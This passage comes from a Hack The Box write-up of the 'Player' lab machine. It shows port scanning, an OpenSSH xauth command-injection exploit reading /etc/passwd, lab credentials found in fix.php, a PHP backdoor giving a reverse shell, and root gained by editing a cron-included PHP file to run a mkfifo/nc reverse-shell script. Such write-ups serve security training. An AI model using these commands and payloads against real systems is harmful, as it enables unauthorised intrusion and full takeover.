+&lt;br /&gt;&lt;br /&gt;I tried these credentials with &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; and with &lt;code class=&quot;highlighter-rouge&quot;&gt;dev.player.htb&lt;/code&gt; and they didn’t work. I ran a quick full port scan with &lt;code class=&quot;highlighter-rouge&quot;&gt;masscan&lt;/code&gt; and turns out that there was another open port:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/player# masscan -p1-65535 10.10.10.145 --rate=1000 -e tun0
+
+Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-01-18 00:09:24 GMT
+ -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+Initiating SYN Stealth Scan
+Scanning 1 hosts [65535 ports/host]
+Discovered open port 22/tcp on 10.10.10.145                                    
+Discovered open port 80/tcp on 10.10.10.145                                    
+Discovered open port 6686/tcp on 10.10.10.145
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;I scanned that port with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; but it couldn’t identify the service:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT     STATE SERVICE    VERSION
+6686/tcp open  tcpwrapped
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;However when I connected to the port with &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; the banner indicated that it was an &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; server:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/player# nc player.htb 6686
+SSH-2.0-OpenSSH_7.2
+
+Protocol mismatch.
+root@kali:~/Desktop/HTB/boxes/player#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;I could login to that &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; server with the credentials, but unfortunately I was in a restricted environment:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/player# ssh telegen@player.htb -p 6686
+The authenticity of host '[player.htb]:6686 ([10.10.10.145]:6686)' can't be established.
+ECDSA key fingerprint is SHA256:oAcCXvit3SHvyq7nuvWntLq+Q+mGlAg8301zhKnJmPM.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[player.htb]:6686,[10.10.10.145]:6686' (ECDSA) to the list of known hosts.
+telegen@player.htb's password: 
+Last login: Tue Apr 30 18:40:13 2019 from 192.168.0.104
+Environment:
+  USER=telegen
+  LOGNAME=telegen
+  HOME=/home/telegen
+  PATH=/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin
+  MAIL=/var/mail/telegen
+  SHELL=/usr/bin/lshell
+  SSH_CLIENT=10.10.xx.xx 43270 6686
+  SSH_CONNECTION=10.10.xx.xx 43270 10.10.10.145 6686
+  SSH_TTY=/dev/pts/4
+  TERM=screen
+========= PlayBuff ==========
+Welcome to Staging Environment
+
+telegen:~$ whoami
+*** forbidden command: whoami
+telegen:~$ help
+  clear  exit  help  history  lpath  lsudo
+telegen:~$ lsudo
+Allowed sudo commands:
+telegen:~$ lpath
+Allowed:
+ /home/telegen
+telegen:~$ pwd
+*** forbidden command: pwd
+telegen:~$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;openssh-72p1-xauth-command-injection--user-flag&quot;&gt;OpenSSH 7.2p1 xauth Command Injection –&amp;gt; User Flag&lt;/h2&gt;
+&lt;p&gt;&lt;br /&gt;When I searched for exploits for that version of &lt;code class=&quot;highlighter-rouge&quot;&gt;openssh&lt;/code&gt; I found this &lt;a href=&quot;https://www.exploit-db.com/exploits/39569&quot;&gt;exploit&lt;/a&gt;.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/player# python 39569.py 
+ Usage: &amp;lt;host&amp;gt; &amp;lt;port&amp;gt; &amp;lt;username&amp;gt; &amp;lt;password or path_to_privkey&amp;gt;
+        
+        path_to_privkey - path to private key in pem format, or '.demoprivkey' to use demo private key
+        
+
+root@kali:~/Desktop/HTB/boxes/player# python 39569.py player.htb 6686 telegen 'd-bC|jC!2uepS/w'
+INFO:__main__:connecting to: telegen:d-bC|jC!2uepS/w@player.htb:6686
+INFO:__main__:connected!
+INFO:__main__:
+Available commands:
+    .info
+    .readfile &amp;lt;path&amp;gt;
+    .writefile &amp;lt;path&amp;gt; &amp;lt;data&amp;gt;
+    .exit .quit
+    &amp;lt;any xauth command or type help&amp;gt;
+
+#&amp;gt; .readfile /etc/passwd
+DEBUG:__main__:auth_cookie: 'xxxx\nsource /etc/passwd\n'
+DEBUG:__main__:dummy exec returned: None
+INFO:__main__:root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+libuuid:x:100:101::/var/lib/libuuid:
+syslog:x:101:104::/home/syslog:/bin/false
+messagebus:x:102:106::/var/run/dbus:/bin/false
+landscape:x:103:109::/var/lib/landscape:/bin/false
+telegen:x:1000:1000:telegen,,,:/home/telegen:/usr/bin/lshell
+sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+mysql:x:105:113:MySQL
+colord:x:106:116:colord
+staged-dev:x:4000000000:1001::/home/staged-dev:/bin/sh
+#&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;I tried to use &lt;code class=&quot;highlighter-rouge&quot;&gt;.writefile&lt;/code&gt; to write a &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; file and get a reverse shell but I couldn’t do that. But anyway I was finally able to read the user flag:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/player/19.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;credentials-in-fixphp--rce--shell-as-www-data&quot;&gt;Credentials in fix.php –&amp;gt; RCE –&amp;gt; Shell as www-data&lt;/h2&gt;
+&lt;p&gt;&lt;br /&gt;Earlier I couldn’t read &lt;code class=&quot;highlighter-rouge&quot;&gt;fix.php&lt;/code&gt; through the &lt;code class=&quot;highlighter-rouge&quot;&gt;ffmpeg&lt;/code&gt; exploit, I was able to read it as &lt;code class=&quot;highlighter-rouge&quot;&gt;telegen&lt;/code&gt; and I found credentials for a user called &lt;code class=&quot;highlighter-rouge&quot;&gt;peter&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#&amp;gt; .readfile /var/www/staging/fix.php                                    
+DEBUG:__main__:auth_cookie: 'xxxx\nsource /var/www/staging/fix.php\n'          
+DEBUG:__main__:dummy exec returned: None
+INFO:__main__:&amp;lt;?php       
+class                            
+protected                                          
+protected                                      
+protected                                      
+public                                       
+return                                          
+}
+public
+if($result
+static::passed($test_name);
+}
+static::failed($test_name);
+}
+}
+public
+if($result
+static::failed($test_name);
+}
+static::passed($test_name);
+}
+}
+public
+if(!$username){
+$username
+$password
+}
+//modified
+//for
+//fix
+//peter
+//CQXpm\z)G5D#%S$y=
+}
+public
+if($result
+static::passed($test_name);
+}
+static::failed($test_name);
+}
+}
+public
+echo
+echo
+echo
+}
+private
+echo
+static::$failed++;
+}
+private
+static::character(&quot;.&quot;);
+static::$passed++;
+}
+private
+echo
+static::$last_echoed
+}
+private
+if(static::$last_echoed
+echo
+static::$last_echoed
+}
+}
+#&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;These credentials (&lt;code class=&quot;highlighter-rouge&quot;&gt;peter : CQXpm\z)G5D#%S$y=&lt;/code&gt;) worked with &lt;code class=&quot;highlighter-rouge&quot;&gt;dev.player.htb&lt;/code&gt;:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/player/20.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/player/21.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+I tried to create a new project in &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html&lt;/code&gt;:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/player/22.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;But I got an error saying that I was only allowed to create projects in &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/demo/home&lt;/code&gt; so I created a project there:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/player/23.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;When I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; on &lt;code class=&quot;highlighter-rouge&quot;&gt;http://dev.player.htb/&lt;/code&gt; there was a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;home&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/player# gobuster dir -u http://dev.player.htb/ -w /usr/share/wordlists/dirb/common.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://dev.player.htb/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/01/17 20:18:00 Starting gobuster
+===============================================================
+/.hta (Status: 403)
+/.htpasswd (Status: 403)
+/.htaccess (Status: 403)
+/components (Status: 301)
+/data (Status: 301)
+/favicon.ico (Status: 200)
+/home (Status: 301)
+/index.php (Status: 200)
+/js (Status: 301)
+/languages (Status: 301)
+/lib (Status: 301)
+/plugins (Status: 301)
+/server-status (Status: 403)
+/themes (Status: 301)
+===============================================================
+2020/01/17 20:19:49 Finished
+===============================================================
+root@kali:~/Desktop/HTB/boxes/player# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;I wanted to see if that was related to &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/demo/home&lt;/code&gt; so I created a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;test.php&lt;/code&gt; that echoed &lt;code class=&quot;highlighter-rouge&quot;&gt;test&lt;/code&gt; and I tried to access it through &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt;:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/player/24.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/player/25.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;It worked so I edited my test file and added the &lt;code class=&quot;highlighter-rouge&quot;&gt;php-simple-backdoor&lt;/code&gt; code and got a reverse shell:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/player/26.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/player/27.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/player# nc -lvnp 1337
+listening on [any] 1337 ...
+connect to [10.10.xx.xx] from (UNKNOWN) [10.10.10.145] 56714
+/bin/sh: 0: can't access tty; job control turned off
+$ which python
+/usr/bin/python
+$ python -c &quot;import pty;pty.spawn('/bin/bash')&quot;
+www-data@player:/var/www/demo/home$ ^Z
+[1]+  Stopped                 nc -lvnp 1337
+root@kali:~/Desktop/HTB/boxes/player# stty raw -echo
+root@kali:~/Desktop/HTB/boxes/player# nc -lvnp 1337
+
+www-data@player:/var/www/demo/home$ export TERM=screen
+www-data@player:/var/www/demo/home$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@player:/var/www/demo/home$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;root-flag&quot;&gt;Root Flag&lt;/h2&gt;
+&lt;p&gt;&lt;br /&gt;when I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;pspy&lt;/code&gt; to monitor the processes I noticed that &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/lib/playbuff/buff.php&lt;/code&gt; got executed as root periodically:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;2020/01/18 05:25:02 CMD: UID=0    PID=3650   | /usr/bin/php /var/lib/playbuff/buff.php 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;I couldn’t write to it but it included another &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; file which I could write to (&lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php&lt;/code&gt;):&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;player&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;lib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;playbuff&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;player&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;lib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;playbuff&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt; 
+&lt;span class=&quot;o&quot;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;playBuff&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$logFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/var/log/playbuff/logs.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$logData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Updated&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+        &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__wakeup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;nb&quot;&gt;file_put_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;__DIR__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;logFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;logData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$buff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;playBuff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$serialbuff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file_get_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/var/lib/playbuff/merge.log&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;unserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$update&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file_get_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/var/lib/playbuff/logs.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mysqli_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;update stats set status='&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$update&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;' where id=1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Update Success with serialized logs!'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;file_put_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/var/lib/playbuff/merge.log&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;no issues yet&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$update&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file_get_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/var/lib/playbuff/logs.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mysqli_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;update stats set status='&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$update&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;' where id=1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Update Success!'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+www-data@player:/var/lib/playbuff$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;I put my reverse shell payload in &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; and added a line to &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php&lt;/code&gt; that executed it:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@player:/$ cat /var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php
+&amp;lt;?php
+$servername = &quot;localhost&quot;;
+$username = &quot;root&quot;;
+$password = &quot;&quot;;
+$dbname = &quot;integrity&quot;;
+
+system(&quot;bash -c /tmp/pwned.sh&quot;);
+
+// Create connection
+$conn = new mysqli($servername, $username, $password, $dbname);
+// Check connection
+if ($conn-&amp;gt;connect_error) {
+    die(&quot;Connection failed: &quot; . $conn-&amp;gt;connect_error);
+}
+?&amp;gt;
+www-data@player:/$ cat /tmp/pwned.sh 
+#!/bin/bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.xx.xx 1338 &amp;gt;/tmp/f
+www-data@player:/$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/player/28.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;And we owned root !
+&lt;br /&gt;That’s it , Feedback is appreciated !
+&lt;br /&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;
+&lt;br /&gt;Thanks for reading.
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;br /&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/bitlab/&quot;&gt;Hack The Box - Bitlab&lt;/a&gt;&lt;/p&gt;
+&lt;hr /&gt;</content><author><name></name></author><category term="linux" /><category term="web" /><category term="ssh" /><category term="rce" /><category term="php" /><category term="jwt" /><category term="code-analysis" /><summary type="html">Quick Summary Hey guys, today Player retired and here’s my write-up about it. It was a relatively hard CTF-style machine with a lot of enumeration and a couple of interesting exploits. It’s a Linux box and its ip is 10.10.10.145, I added it to /etc/hosts as player.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services: ``` root@kali:~/Desktop/HTB/boxes/player# nmap -sV -sT -sC -o nmapinitial player.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-17 16:29 EST Nmap scan report for player.htb (10.10.10.145) Host is up (0.35s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 d7:30:db:b9:a0:4c:79:94:78:38:b3:43:a2:50:55:81 (DSA) | 2048 